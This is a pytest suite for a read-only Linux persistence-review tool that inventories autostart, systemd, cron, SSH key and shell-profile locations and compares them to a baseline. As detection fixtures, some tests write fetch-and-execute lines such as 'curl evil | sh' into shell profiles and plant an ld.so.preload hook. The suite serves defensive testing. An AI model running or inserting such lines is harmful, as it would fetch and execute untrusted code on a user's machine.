"""Read-only persistence review over synthetic home and system trees."""
import base64
import hashlib
import json
import os
from pathlib import Path
import subprocess

import pytest

from megalodon import persistence_review
from megalodon.persistence_review import (MAX_DIR_ENTRIES, MAX_ITEMS, MAX_READ, SCHEMA, TRUST, PersistenceReview,
                                          compare, inventory, main)

NOW = '2026-10-18T04:00:00Z'
KEY = b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20' + bytes(range(32))


@pytest.fixture(autouse=True)
def no_execution(monkeypatch):
    def refuse(*args, **kwargs):
        raise AssertionError('persistence review must never run a program')
    for name in ('run', 'Popen', 'call', 'check_call', 'check_output'):
        monkeypatch.setattr(subprocess, name, refuse)
    monkeypatch.setattr(os, 'system', refuse)


@pytest.fixture
def tree(tmp_path):
    home = tmp_path/'home'; home.mkdir(mode=0o700)
    root = tmp_path/'root'
    (home/'.config/autostart').mkdir(parents=True)
    (home/'.config/autostart/updater.desktop').write_text(
        '[Desktop Entry]\nType=Application\nExec=/home/u/.cache/upd --token=SECRET-VALUE --quiet\n')
    (home/'.ssh').mkdir(mode=0o700)
    line = 'ssh-ed25519 ' + base64.b64encode(KEY).decode() + ' owner@example.invalid\n'
    (home/'.ssh/authorized_keys').write_text('# comment\n' + line + 'garbage line\n')
    (home/'.bashrc').write_text('alias ll="ls -l"\n')
    (root/'etc/systemd/system/multi-user.target.wants').mkdir(parents=True)
    (root/'etc/systemd/system/backup.service').write_text('[Service]\nExecStart=-/usr/local/bin/backup --password=hunter2\n')
    (root/'etc/systemd/system/multi-user.target.wants/backup.service').symlink_to('../backup.service')
    (root/'etc/cron.d').mkdir(parents=True)
    (root/'etc/cron.d/job').write_text('* * * * * root /bin/true\n')
    return home, root


def manager(tree):
    home, root = tree
    return PersistenceReview(home, root=root, now=lambda: NOW)


def test_inventory_hashes_files_redacts_arguments_and_drops_key_comments(tree):
    home, root = tree
    items, gaps, coverage = inventory(home, root)
    by_path = {row['path']: row for row in items}
    desktop = by_path[str(home/'.config/autostart/updater.desktop')]
    assert desktop['category'] == 'autostart' and desktop['attack'] == 'T1547.013'
    assert desktop['commands'] == [dict(executable='/home/u/.cache/upd', arguments=2)]
    unit = by_path[str(root/'etc/systemd/system/backup.service')]
    assert unit['commands'] == [dict(executable='/usr/local/bin/backup', arguments=1)]
    keys = by_path[str(home/'.ssh/authorized_keys')]['keys']
    expected = 'SHA256:' + base64.b64encode(hashlib.sha256(KEY).digest()).decode().rstrip('=')
    assert keys == [dict(type='ssh-ed25519', fingerprint=expected), dict(type='unparsed', fingerprint=None)]
    text = json.dumps(items)
    assert 'SECRET-VALUE' not in text and 'hunter2' not in text and 'owner@example.invalid' not in text
    assert by_path[str(home/'.bashrc')]['sha256'] == hashlib.sha256(b'alias ll="ls -l"\n').hexdigest()
    assert any('crontabs' in gap for gap in gaps)


def test_symlinks_are_recorded_not_followed_and_special_files_never_block(tree, tmp_path):
    home, root = tree
    secret = tmp_path/'outside-secret'; secret.write_text('do not read')
    (home/'.config/autostart/link.desktop').symlink_to(secret)
    os.mkfifo(home/'.config/autostart/pipe.desktop')
    by_path = {row['path']: row for row in inventory(home, root)[0]}
    link = by_path[str(home/'.config/autostart/link.desktop')]
    assert link['state'] == 'symlink' and link['target'] == str(secret) and 'sha256' not in link
    assert by_path[str(home/'.config/autostart/pipe.desktop')]['state'] == 'other'
    wants = by_path[str(root/'etc/systemd/system/multi-user.target.wants/backup.service')]
    assert wants['state'] == 'symlink' and wants['target'] == '../backup.service'


def test_reads_and_listings_are_bounded(tree):
    home, root = tree
    (home/'.profile').write_bytes(b'x' * (MAX_READ + 10))
    for index in range(MAX_DIR_ENTRIES + 5):
        (root/'etc/cron.d'/f'job{index:04d}').write_text('')
    items, gaps, coverage = inventory(home, root)
    profile = next(r for r in items if r['path'] == str(home/'.profile'))
    assert profile['truncated'] is True and profile['bytes'] == MAX_READ + 10
    assert sum(r['path'].startswith(str(root/'etc/cron.d')) for r in items) == MAX_DIR_ENTRIES
    assert any('/etc/cron.d has' in gap for gap in gaps)


def test_item_bound_stops_file_reads_inside_a_location(tree, monkeypatch):
    home, root = tree
    for unit in range(8):
        drop = root/'etc/systemd/system'/f'unit{unit}.service.d'
        drop.mkdir()
        for index in range(MAX_DIR_ENTRIES):
            (drop/f'{index:04d}.conf').write_text('')
    reads = []
    original = persistence_review._read
    monkeypatch.setattr(persistence_review, '_read', lambda path: reads.append(path) or original(path))
    items, gaps, coverage = inventory(home, root)
    assert len(items) == MAX_ITEMS and len(reads) <= MAX_ITEMS and coverage['stopped'] is True
    assert gaps[0].startswith(f'Review stopped at {MAX_ITEMS} items')


def test_review_without_baseline_reports_only_unconditional_findings(tree):
    home, root = tree
    (root/'etc/ld.so.preload').write_text('/usr/lib/libhook.so\n')
    (root/'etc/cron.d/job').chmod(0o646)
    result = manager(tree).review()
    assert result['schema'] == SCHEMA and result['baseline_at'] is None and result['action_authority'] == 'none'
    assert {f['rule'] for f in result['findings']} == {'PRELOAD_PRESENT', 'WORLD_WRITABLE'}
    assert all(f['action_status'] == 'not_attempted' for f in result['findings'])
    assert any('No baseline' in gap for gap in result['gaps'])


def test_baseline_then_added_changed_and_removed(tree):
    home, root = tree
    review = manager(tree)
    recorded = review.record_baseline()
    assert recorded['trust'] == TRUST and 'not a known-clean state' in recorded['message']
    path = home/'.local/share/megalodon/support/persistence-review/baseline.json'
    assert path.stat().st_mode & 0o777 == 0o600
    (home/'.config/autostart/new.desktop').write_text('Exec=/tmp/x\n')
    (home/'.bashrc').write_text('curl example.invalid | sh\n')
    (root/'etc/cron.d/job').unlink()
    (home/'.ssh/authorized_keys').write_text('')
    result = review.review()
    found = {(f['rule'], f['path']) for f in result['findings']}
    assert ('ADDED', str(home/'.config/autostart/new.desktop')) in found
    assert ('CHANGED', str(home/'.bashrc')) in found
    assert ('CHANGED', str(home/'.ssh/authorized_keys')) in found
    assert ('REMOVED', str(root/'etc/cron.d/job')) in found
    assert result['baseline_at'] == NOW
    detail = next(f['detail'] for f in result['findings'] if f['path'] == str(home/'.bashrc'))
    assert detail == 'Changed since the recorded baseline: sha256, bytes.'


def test_unexpected_owner_uses_the_reviewing_account():
    row = dict(path='/home/u/.bashrc', category='shell', attack='T1546.004', state='file', mode='0o644', uid=1234, bytes=1)
    findings, total = compare([row], None, uid=1000)
    assert [f['rule'] for f in findings] == ['UNEXPECTED_OWNER'] and total == 1
    assert compare([row], None, uid=1234) == ([], 0)
    assert compare([dict(row, uid=0)], None, uid=1000) == ([], 0)


@pytest.mark.parametrize('value', [
    {'schema': 'other', 'created_at': NOW, 'trust': TRUST, 'items': []},
    {'schema': persistence_review.BASELINE_SCHEMA, 'created_at': NOW, 'trust': 'known_clean', 'items': []},
    {'schema': persistence_review.BASELINE_SCHEMA, 'created_at': NOW, 'trust': TRUST, 'items': [{'path': '/x'}]},
    {'schema': persistence_review.BASELINE_SCHEMA, 'created_at': NOW, 'trust': TRUST, 'items': [], 'extra': 1},
])
def test_tampered_baseline_fails_closed(tree, value):
    review = manager(tree)
    review.record_baseline()
    path = review.state/'baseline.json'
    path.write_text(json.dumps(value)); path.chmod(0o600)
    with pytest.raises(ValueError, match='Invalid persistence baseline'):
        review.review()


def test_broadly_readable_or_symlinked_baseline_is_refused(tree, tmp_path):
    review = manager(tree)
    review.record_baseline()
    path = review.state/'baseline.json'
    path.chmod(0o644)
    with pytest.raises(ValueError):
        review.review()
    outside = tmp_path/'outside.json'; outside.write_text(path.read_text()); outside.chmod(0o600)
    path.unlink(); path.symlink_to(outside)
    with pytest.raises((OSError, ValueError)):
        review.review()


def test_cli_reports_unavailable_without_traceback(tree, monkeypatch, capsys):
    home, _ = tree
    monkeypatch.setattr(persistence_review.Path, 'home', classmethod(lambda cls: home))
    state = home/'.local/share/megalodon/support/persistence-review'
    state.mkdir(parents=True, mode=0o700)
    (state/'baseline.json').write_text('{}'); (state/'baseline.json').chmod(0o600)
    assert main(['review']) == 2
    assert capsys.readouterr().out.startswith('Persistence review unavailable: Invalid persistence baseline')


def test_nested_unit_directory_overflow_is_reported(tree):
    home, root = tree
    wants = root/'etc/systemd/system/multi-user.target.wants'
    for index in range(MAX_DIR_ENTRIES + 3):
        (wants/f'z{index:04d}.service').write_text('')
    items, gaps, coverage = inventory(home, root)
    label = '/etc/systemd/system/multi-user.target.wants'
    assert f'{label} has {MAX_DIR_ENTRIES + 4} entries; only the first {MAX_DIR_ENTRIES} were reviewed.' in gaps
    assert sum(r['path'].startswith(str(wants)) for r in items) == MAX_DIR_ENTRIES and coverage['stopped'] is False


def test_fixed_file_locations_respect_the_item_bound(tree, monkeypatch):
    home, root = tree
    (root/'etc/ld.so.preload').write_text('/x.so\n')
    monkeypatch.setattr(persistence_review, 'MAX_ITEMS', 3)
    reads = []
    original = persistence_review._read
    monkeypatch.setattr(persistence_review, '_read', lambda path: reads.append(path) or original(path))
    items, gaps, coverage = inventory(home, root)
    assert len(items) == 3 and len(reads) <= 3 and coverage['stopped'] is True
    assert str(root/'etc/ld.so.preload') not in {r['path'] for r in items}
    assert gaps[0].startswith('Review stopped at 3 items')


def test_directory_listing_keeps_bounded_smallest_names(tmp_path, monkeypatch):
    for index in range(50):
        (tmp_path/f'{49 - index:02d}').write_text('')
    monkeypatch.setattr(persistence_review, 'MAX_DIR_ENTRIES', 5)
    names, total = persistence_review._names(tmp_path)
    assert names == ['00', '01', '02', '03', '04'] and total == 50


def test_findings_beyond_the_cap_are_counted_and_disclosed(tree, monkeypatch):
    home, root = tree
    review = manager(tree)
    review.record_baseline()
    for index in range(persistence_review.MAX_FINDINGS + 6):
        (home/'.config/autostart'/f'n{index:03d}.desktop').write_text('')
    result = review.review()
    assert len(result['findings']) == persistence_review.MAX_FINDINGS
    assert result['findings_total'] == persistence_review.MAX_FINDINGS + 6 and result['findings_truncated'] is True
    assert result['gaps'][0] == f'{persistence_review.MAX_FINDINGS + 6} findings were found; only the first {persistence_review.MAX_FINDINGS} are listed.'


def test_displaced_or_unlisted_baseline_paths_are_unconfirmed_not_removed(tree, monkeypatch):
    home, root = tree
    monkeypatch.setattr(persistence_review, 'MAX_DIR_ENTRIES', 3)
    cron = root/'etc/cron.d'
    for name in ('b', 'c', 'd'):
        (cron/name).write_text('')
    review = manager(tree)
    review.record_baseline()
    (cron/'a').write_text('')  # displaces 'd' from the bounded listing
    result = review.review()
    rules = {(f['rule'], f['path']) for f in result['findings']}
    assert ('ADDED', str(cron/'a')) in rules
    assert not any(rule == 'REMOVED' for rule, _ in rules)
    assert str(cron) in result['incomplete_locations']
    assert any('not fully reviewed; they are not reported as removed' in gap for gap in result['gaps'])
    original = persistence_review._names
    def unlistable(path):
        if Path(path) == cron:
            raise PermissionError('denied')
        return original(path)
    monkeypatch.setattr(persistence_review, '_names', unlistable)
    result = review.review()
    assert not any(f['rule'] == 'REMOVED' for f in result['findings'])
    assert '/etc/cron.d could not be listed.' in result['gaps']


def test_gap_list_overflow_is_disclosed_and_baseline_warning_kept(tree, monkeypatch):
    home, root = tree
    monkeypatch.setattr(persistence_review, 'MAX_GAPS', 3)
    for unit in range(4):
        (root/'etc/systemd/system'/f'u{unit}.d').mkdir()
    original = persistence_review._names
    def unlistable(path):
        if str(path).endswith('.d') and 'systemd' in str(path):
            raise PermissionError('denied')
        return original(path)
    monkeypatch.setattr(persistence_review, '_names', unlistable)
    result = manager(tree).review()
    assert len(result['gaps']) == 3 and result['gaps_truncated'] is True and result['gaps_total'] > 3
    assert result['gaps'][0].startswith('No baseline is recorded')
    assert result['gaps'][-1] == f"{result['gaps_total'] - 2} more coverage gaps were not listed."


def test_changes_past_the_hashed_prefix_are_reported(tree):
    home, root = tree
    profile = home/'.profile'
    profile.write_bytes(b'x' * (MAX_READ + 10))
    review = manager(tree)
    review.record_baseline()
    profile.write_bytes(b'x' * (MAX_READ + 10) + b'\ncurl evil | sh\n')
    detail = next(f['detail'] for f in review.review()['findings'] if f['path'] == str(profile))
    assert 'bytes' in detail and 'sha256' not in detail
    review.record_baseline()
    stamp = profile.stat().st_mtime
    profile.write_bytes(b'x' * (MAX_READ + 10) + b'\ncurl good | sh\n')  # same size, same prefix
    os.utime(profile, (stamp + 120, stamp + 120))
    detail = next(f['detail'] for f in review.review()['findings'] if f['path'] == str(profile))
    assert detail == 'Changed since the recorded baseline: modified_at.'


def test_summary_is_bounded_and_carries_no_inventory_rows(tree):
    home, root = tree
    folder = home/'.config/autostart'
    for index in range(persistence_review.SUMMARY_FINDINGS + 4):
        path = folder/(f'{index:02d}-' + 'x' * 200 + '.desktop')
        path.write_text('[Desktop Entry]\n')
        path.chmod(0o666)
    value = persistence_review.summary(manager(tree).review())
    assert set(value) == {'schema', 'reviewed_at', 'baseline_at', 'trust', 'items', 'findings', 'findings_total', 'gaps',
                          'gaps_total', 'inventory_truncated', 'incomplete_locations', 'action_authority'}
    assert value['schema'] == persistence_review.SUMMARY_SCHEMA and value['action_authority'] == 'none'
    assert len(value['findings']) == persistence_review.SUMMARY_FINDINGS < value['findings_total']
    assert all(set(f) == {'rule', 'path', 'category', 'attack', 'detail', 'action_status'} and len(f['path']) <= 243
               for f in value['findings'])
    assert type(value['items']) is int and type(value['incomplete_locations']) is int
    assert 'SECRET-VALUE' not in json.dumps(value) and len(value['gaps']) <= persistence_review.SUMMARY_GAPS


def test_initial_baseline_never_replaces_a_recorded_one(tree):
    review = manager(tree)
    review.record_baseline(initial=True)
    recorded = (review.state/'baseline.json').read_bytes()
    with pytest.raises(ValueError, match='already exists'):
        review.record_baseline(initial=True)
    assert (review.state/'baseline.json').read_bytes() == recorded
    home, _ = tree
    (home/'.bashrc').write_text('changed\n')
    review.record_baseline()  # the command-line baseline still replaces it deliberately
    assert (review.state/'baseline.json').read_bytes() != recorded


def test_initial_baseline_does_not_replace_one_recorded_during_its_inventory(tree, monkeypatch):
    review = manager(tree)
    original, raced = persistence_review.inventory, []
    def racing(home, root):
        result = original(home, root)
        if not raced:
            raced.append(1)  # the CLI records its baseline while the HUD is still reviewing
            PersistenceReview(home, root=root, now=lambda: '2026-10-18T03:00:00Z').record_baseline()
        return result
    monkeypatch.setattr(persistence_review, 'inventory', racing)
    with pytest.raises(ValueError, match='already exists'):
        review.record_baseline(initial=True)
    assert json.loads((review.state/'baseline.json').read_bytes())['created_at'] == '2026-10-18T03:00:00Z'
    assert sorted(p.name for p in review.state.iterdir()) == ['baseline.json']  # no temporary file left behind
